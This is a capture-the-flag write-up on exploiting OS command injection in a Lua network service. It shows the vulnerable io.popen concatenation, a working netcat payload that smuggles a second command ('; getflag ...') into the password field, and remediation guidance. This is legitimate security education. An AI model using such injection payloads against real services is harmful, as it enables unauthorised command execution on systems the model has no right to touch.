# Level 11 — OS Command Injection via Lua Network Service

## Overview

This level exposes a Lua script running a local TCP server on port 5151.
The server accepts a password, hashes it with SHA1, and compares it to a
known value. The vulnerability lies in how the hash function is constructed.

## Source Analysis
```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
end
```

The `..` operator in Lua is string concatenation. The user-supplied `pass`
is concatenated directly into a shell command string and executed via
`io.popen`, without any sanitisation. This is a textbook OS Command Injection
vulnerability.

## Exploitation

The server listens on localhost:5151. Connecting with netcat and sending a
crafted payload breaks out of the intended echo command using a semicolon,
then executes `getflag` as the privileged `flag11` user (the binary runs
with setuid permissions).
```bash
nc localhost 5151
Password: ; getflag > /tmp/flag11 2>&1
cat /tmp/flag11
```

The shell interprets the injected input as:
```bash
echo ; getflag > /tmp/flag11 2>&1 | sha1sum
```

The `2>&1` redirect is required because `getflag` writes its output to
stderr rather than stdout.

## Vulnerability Class

OS Command Injection (CWE-78) — OWASP Top 10: A03 Injection

## Remediation

- Never concatenate user input directly into shell command strings.
- Use parameterised command execution where the input is passed as an
  argument, not interpolated into a string evaluated by a shell.
- Validate and whitelist input before any processing (e.g. accept only
  alphanumeric characters for a password field).
- Apply the principle of least privilege: avoid running network-facing
  services with setuid permissions.

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [CWE-78: Improper Neutralization of Special Elements](https://cwe.mitre.org/data/definitions/78.html)
